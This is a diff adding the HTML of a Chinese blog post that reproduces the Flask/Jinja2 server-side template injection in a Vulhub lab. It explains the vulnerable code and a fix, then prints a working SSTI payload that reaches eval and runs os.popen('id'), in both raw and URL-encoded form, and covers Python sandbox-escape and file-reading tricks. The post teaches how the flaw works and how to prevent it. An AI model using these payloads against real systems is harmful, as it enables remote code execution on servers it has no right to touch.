@@ -1,0 +1,1595 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="https://fonts.css.network//css?family=Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="flask ssti漏洞复现  开一个新坑关于漏洞复现，通过复现漏洞去学习一些东西，这里分享一个好用的漏洞环境：Vulhub vulhub有太多环境了，这里先从一些自己比较熟悉的开始学习。所以选择了flask/ssti">
+<meta name="keywords" content="python security,flask ssti,Vulhub,漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask ssti漏洞复现">
+<meta property="og:url" content="http://miracle778.github.io/漏洞复现/flask-ssti/flask-ssti漏洞复现.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="flask ssti漏洞复现  开一个新坑关于漏洞复现，通过复现漏洞去学习一些东西，这里分享一个好用的漏洞环境：Vulhub vulhub有太多环境了，这里先从一些自己比较熟悉的开始学习。所以选择了flask/ssti">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//6.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//7.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//9.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//10.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//11.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//12.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//13.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//14.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//15.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//16.JPG">
+<meta property="og:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//17.JPG">
+<meta property="og:updated_time" content="2019-04-10T10:51:50.320Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="flask ssti漏洞复现">
+<meta name="twitter:description" content="flask ssti漏洞复现  开一个新坑关于漏洞复现，通过复现漏洞去学习一些东西，这里分享一个好用的漏洞环境：Vulhub vulhub有太多环境了，这里先从一些自己比较熟悉的开始学习。所以选择了flask/ssti">
+<meta name="twitter:image" content="http://miracle778.github.io/漏洞复现/flask-ssti//flask-ssti漏洞复现//1.JPG">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/漏洞复现/flask-ssti/flask-ssti漏洞复现.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>flask ssti漏洞复现 | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/漏洞复现/flask-ssti/flask-ssti漏洞复现.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">flask ssti漏洞复现
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-10 13:12:06 / 修改时间：18:51:50" itemprop="dateCreated datePublished" datetime="2019-04-10T13:12:06+08:00">2019-04-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞复现/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞复现/flask-ssti/" itemprop="url" rel="index"><span itemprop="name">flask/ssti</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/漏洞复现/flask-ssti/flask-ssti漏洞复现.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/漏洞复现/flask-ssti/flask-ssti漏洞复现.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">6.3k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">6 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center><strong>flask ssti漏洞复现</strong></center>
+
+<p>开一个新坑关于漏洞复现，通过复现漏洞去学习一些东西，这里<a href="https://www.freebuf.com/sectool/165062.html" target="_blank" rel="noopener">分享一个好用的漏洞环境：Vulhub</a></p>
+<p>vulhub有太多环境了，这里先从一些自己比较熟悉的开始学习。所以选择了flask/ssti<br><a id="more"></a></p>
+<pre><code>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个
+全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。
+</code></pre><hr>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>flask/ssti漏洞，完整叫法应该是: Flask（Jinja2） 服务端模板注入漏洞(SSTI)。上网找了找别人的分析文章。看了一大圈下来，发现都没怎么讲原理，都是直接开干，或许是这个漏洞太简单了吧233~。<br>不过最后还是找到一篇提了提原理的博客。贴在下面好了，因为我之前略微学了几天flask，所以这个漏洞原理理解复现起来还是挺顺畅的。<br><a href="https://www.cnblogs.com/leixiao-/p/10227867.html#autoid-2-0-0" target="_blank" rel="noopener">Flask（Jinja2） 服务端模板注入漏洞(SSTI)</a></p>
+<hr>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="0x01-Flask"><a href="#0x01-Flask" class="headerlink" title="0x01 Flask"></a>0x01 Flask</h3><h4 id="Flask简介"><a href="#Flask简介" class="headerlink" title="Flask简介"></a>Flask简介</h4><p>Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。<br>Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。</p>
+<h4 id="Flask简单示例"><a href="#Flask简单示例" class="headerlink" title="Flask简单示例"></a>Flask简单示例</h4><p>flask简单易学，下面代码是flask版的hello world<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
+<p>简单说下上面代码，第1、2行是初始化过程。3-5行是使用Flask提供的app.route修饰器,把修饰的函数注册为<strong>路由</strong>。简单讲就是当访问<a href="http://xxx.xx.xx/时，使用hello函数进行处理响应。" target="_blank" rel="noopener">http://xxx.xx.xx/时，使用hello函数进行处理响应。</a></p>
+<p>flask就简单这么提一下吧，具体的我也写不来，毕竟这是分析flask/ssti漏洞，不是flask学习笔记，而且我flask也就之前看过几天。如果有想仔细学flask的兄贵的话，我只能在下面贴个pdf链接了。。<br><a href="https://github.com/Miracle778/PDF/blob/master/Python/Flask-Web%E5%BC%80%E5%8F%91%EF%BC%9A%E5%9F%BA%E4%BA%8EPython%E7%9A%84Web%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98.pdf" target="_blank" rel="noopener">Flask-Web开发:基于Python的Web应用开发实战</a></p>
+<h3 id="0x02-Jinja2"><a href="#0x02-Jinja2" class="headerlink" title="0x02 Jinja2"></a>0x02 Jinja2</h3><h4 id="Jinja2简介"><a href="#Jinja2简介" class="headerlink" title="Jinja2简介"></a>Jinja2简介</h4><p>Jinja 2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。Jinja支持python语句</p>
+<h4 id="Jinja2-模版部分语法"><a href="#Jinja2-模版部分语法" class="headerlink" title="Jinja2 模版部分语法"></a>Jinja2 模版部分语法</h4><ol>
+<li><p>变量<br> Jinja2 使用结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取<br> Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123; name|capitalize &#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>if&amp;for语句<br>if语句简单示例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> user %&#125;</span><br><span class="line">     Hello,&#123;&#123;user&#125;&#125; !</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">     Hello,Stranger!</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<p>for语句循环渲染一组元素</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="0x01-查看源码"><a href="#0x01-查看源码" class="headerlink" title="0x01 查看源码"></a>0x01 查看源码</h3><ol>
+<li><p>cd进flask/ssti目录，开启ssti环境<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\1.JPG" alt></p>
+</li>
+<li><p>访问一下目标环境,可以看到开启成功<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\2.JPG" alt></p>
+</li>
+<li><p>接下来看一下网页app.py源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="0x02-漏洞成因分析"><a href="#0x02-漏洞成因分析" class="headerlink" title="0x02 漏洞成因分析"></a>0x02 漏洞成因分析</h3><p>可以看到上面第10行代码 <code>t = Template(&quot;Hello &quot; + name)</code>,<strong>Template()完全可控</strong>，那么就可以直接写入jinja2的模板语言，如下图，页面返回54289，证明存在ssti漏洞<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\3.JPG" alt></p>
+<h3 id="0x03-漏洞预防测试"><a href="#0x03-漏洞预防测试" class="headerlink" title="0x03 漏洞预防测试"></a>0x03 漏洞预防测试</h3><p>当然这不是jinja 2的问题，而是网站开发人员的疏漏，如果我们可以对上面代码稍作修改，即可以避免<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/safe")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello,&#123;&#123;n&#125;&#125; "</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
+<p>上面修改后代码第6行，将其路由到/safe页面进行访问测试,可以看到原本存在的代码注入漏洞就不存在了<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\4.JPG" alt></p>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>前面分析了ssti漏洞成因，现在就来讲讲如何利用这个注入漏洞搞点事情。首先给出vulhub官网上的文档的POC，后面再分析原理。</p>
+<h3 id="获取eval函数执行任意代码测试"><a href="#获取eval函数执行任意代码测试" class="headerlink" title="获取eval函数执行任意代码测试"></a>获取eval函数执行任意代码测试</h3><p>Vulhub上的ssti文档是直接给了个获取eval函数并执行任意python代码的POC<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>,可以得到结果<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\5.JPG" alt></p>
+<hr>
+<h2 id="python沙盒逃逸"><a href="#python沙盒逃逸" class="headerlink" title="python沙盒逃逸"></a>python沙盒逃逸</h2><p>上面的POC测试用到一堆python特殊方法，初一看还看不懂，于是网上找了找资料学习总结了一下。<br>找到的一些资料博客里管这个叫python沙盒逃逸。于是又查了下<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/" target="_blank" rel="noopener">python沙盒逃逸</a>的定义。<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\6.JPG" alt></p>
+<p>下面是一些python基础知识</p>
+<h3 id="python特殊方法"><a href="#python特殊方法" class="headerlink" title="python特殊方法"></a>python特殊方法</h3><h4 id="0x01-class"><a href="#0x01-class" class="headerlink" title="0x01 __class__"></a>0x01 __class__</h4><p>__class__,返回当前对象所属的类<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\7.JPG" alt></p>
+<h4 id="0x02-base-amp-amp-bases"><a href="#0x02-base-amp-amp-bases" class="headerlink" title="0x02 __base__ &amp;&amp; __bases__"></a>0x02 __base__ &amp;&amp; __bases__</h4><p>__base__ 和 __bases__ 作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\9.JPG" alt></p>
+<h4 id="0x03-mro"><a href="#0x03-mro" class="headerlink" title="0x03 __mro__"></a>0x03 __mro__</h4><p>以元组形式返回继承关系链<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\10.JPG" alt></p>
+<h4 id="0x04-globals"><a href="#0x04-globals" class="headerlink" title="0x04 __globals__"></a>0x04 __globals__</h4><p>以dict形式返回函数所在模块命名空间中的所有变量</p>
+<h4 id="0x05-subclasses"><a href="#0x05-subclasses" class="headerlink" title="0x05 __subclasses__()"></a>0x05 __subclasses__()</h4><p>以列表形式返回类的子类<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\11.JPG" alt></p>
+<h4 id="0x06-builtin-amp-amp-builtins"><a href="#0x06-builtin-amp-amp-builtins" class="headerlink" title="0x06 __builtin__ &amp;&amp; __builtins__"></a>0x06 __builtin__ &amp;&amp; __builtins__</h4><p>python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在<strong>builtins</strong>中可以查到。查看的方法是dir(<strong>builtins</strong>)。在控制台中直接输入<strong>builtins</strong>会看到如下情况(<strong>python2</strong>)<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\12.JPG" alt><br>在python3中__builtin__被换成了builtin,python3中使用方法如下图<br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\13.JPG" alt><br>__builtin__ 和 __builtins__之间是什么关系呢？</p>
+<ol>
+<li><p>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。</p>
+</li>
+<li><p>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</p>
+</li>
+</ol>
+<h3 id="利用python特殊方法bypass沙盒"><a href="#利用python特殊方法bypass沙盒" class="headerlink" title="利用python特殊方法bypass沙盒"></a>利用python特殊方法bypass沙盒</h3><h4 id="0x01-用file对象读取文件-python2"><a href="#0x01-用file对象读取文件-python2" class="headerlink" title="0x01 用file对象读取文件(python2)"></a>0x01 用file对象读取文件(python2)</h4><p>构造继承链的思路是</p>
+<ol>
+<li>随便找一个内置类对象用<strong>class</strong>拿到他所对应的类</li>
+<li>用<strong>bases</strong>拿到基类（<class 'object'>）</class></li>
+<li>用<strong>subclasses</strong>()拿到子类列表</li>
+<li>在子类列表中直接寻找可以利用的类</li>
+</ol>
+<p><code>().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()</code><br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\14.JPG" alt><br>在这堆列表里找到file对应的对象<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> t:</span><br><span class="line">    <span class="keyword">if</span> c.__name__ == <span class="string">'file'</span>:</span><br><span class="line">        <span class="keyword">print</span> t.index(c)</span><br></pre></td></tr></table></figure></p>
